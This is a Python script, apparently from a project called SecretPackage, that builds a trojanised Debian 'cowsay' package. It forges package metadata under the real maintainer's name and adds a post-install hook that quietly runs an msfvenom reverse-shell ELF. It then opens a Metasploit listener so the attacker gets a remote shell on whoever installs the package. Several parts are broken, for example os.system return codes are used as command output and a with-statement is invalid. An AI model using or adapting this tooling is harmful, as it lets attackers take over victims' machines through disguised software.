######################################
##  Programmer: Myriad74            ##
##                                  ##
##  email: myriad74@protonmail.com  ##
######################################

import sys
import signal
import os

if sys.platform.startswith('linux'):
    if os.system("echo $EUID") == 0:
        print("[+] Access granted")
    else:
        print("[-] You must be root to run this program")
        quit()
else:
    print("[-] Operating system must be Linux to run this")
    

def shutdown(signal, frame):
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
    cowsay = os.path.abspath("cowsay") # get absolute path of current working folder
    os.system(f"rm -rf {cowsay}") # remove the folder
    sys.exit() # exit using system call

def cowsay_installation():
    # Installing cowsay (download only)
    print("[+]Installing cowsay")
    os.system("apt --download-only install cowsay") 
    # Extracting package to a new directory called cowsay
    os.system("cd ~/home")
    print("[+] Will install in the home directory of whatever user is currently being used")
    os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay")

def build_package(payload_name, default_path):
    user = os.system("whoami")
    os.system(f"mkdir {default_path} && touch {payload_name}")

    os.system(f"mkdir {default_path}DEBIAN && cd {default_path}/DEBIAN")
    os.system(f"touch /root/cowsay/DEBIAN/control")

    with open(f"/root/cowsay/DEBIAN/control", "w") as control:
        control.write("Package: cowsay\n")
        control.write("Version: 3.03+dfsg2-4\n")
        control.write("Architecture: all\n")
        control.write("Maintainer: Francois Marier <francois@debian.org>\n")
        control.write("Installed-Size: 90\n")
        control.write("Depends: perl\n")
        control.write("Suggests: filters\n")
        control.write("Section: games\n")
        control.write("Priority: optional\n")
        control.write("Homepage: http://www.nog-net/~tony/warez\n")
        control.write("""Description: configurable talking cow
 Cowsay (or cowthink) will turn text into happy ASCII cows, with
 speech (or thought) balloons. If you don't like cows, ASCII art is 
 available to replace it with some other creatures (Tux, the BSD
 daemon, dragons, and a plethora of animals, from a turkey to
 an elephant in a snake).\n""")

    os.system(f"touch /root/cowsay/DEBIAN/postinst")

    with open(f"/root/cowsay/DEBIAN/postinst", "w") as postinst:
        postinst.write(f"chmod 2755 /usr/games/{payload_name} && usr/games/{payload_name} & /usr/games/cowsay\n")
    
def listener(LHOST):
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listener\033[0m\n")

    start_listener = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start Listener?033[0m\n").lower()
    if start_listener in ["y", "yes"]:
        os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST {LHOST}; run'")
    else:
        sys.exit()

def banner():
    print("""
            _________                            __ __________                __                           
        /   _____/ ____   ___________   _____/  |\______   \_____    ____ |  | _______     ____   ____  
        \_____  \_/ __ \_/ ___\_  __ \_/ __ \   __\     ___/\__  \ _/ ___\|  |/ /\__  \   / ___\_/ __ \ 
        /        \  ___/\  \___|  | \/\  ___/|  | |    |     / __ \\  \___|    <  / __ \_/ /_/  >  ___/ 
        /_______  /\___  >\___  >__|    \___  >__| |____|    (____  /\___  >__|_ \(____  /\___  / \___  >
                \/     \/     \/            \/                    \/     \/     \/     \//_____/      \/   """)
    print("coded by Myriad74")
    print("https://github.com/Myriad74/SecretPackage")

def generate_payload(LHOST, payload_name):
    start_payload = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start payload?: \033[0m\n").lower()
    
    if start_payload in ["y", "yes"]:
        with os.path.abspath(payload_name) as payload_path:
            print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting...\033[0m\n")
            os.system(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -b \"\x00\" -f elf -o {payload_path}")
    else:
        sys.exit()
    
    os.system("chmod 755 postinst")
    os.system(f"dpkg-deb --build {os.path.abspath(payload_name)}")

def main():
    print("TEST")

    if os.path.isfile('/usr/bin/msfconsole'):
        print("TRUE")
        payload_default = "cowsay_trojan"
        default_path = "~/cowsay/"
        payload = input(f"[+] Choose payload name (include full path): (Default) {default_path}")
        exists = os.path.isfile(payload)

        if payload == "":
            payload = f"{default_path}{payload_default}"
        
        elif not exists:
            print("[-] Payload does not exist")

        LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")

        if LHOST == "":
            LHOST = os.system("hostname -i | awk '{print $2}'")
        print(LHOST)

        banner()
        cowsay_installation()
        build_package(payload, default_path)
        generate_payload(LHOST, payload)
        listener(LHOST)
    else:
        print("[-] You do not have msfconsole installed, please run the install.sh script first.")

if __name__ == '__main__':
    main()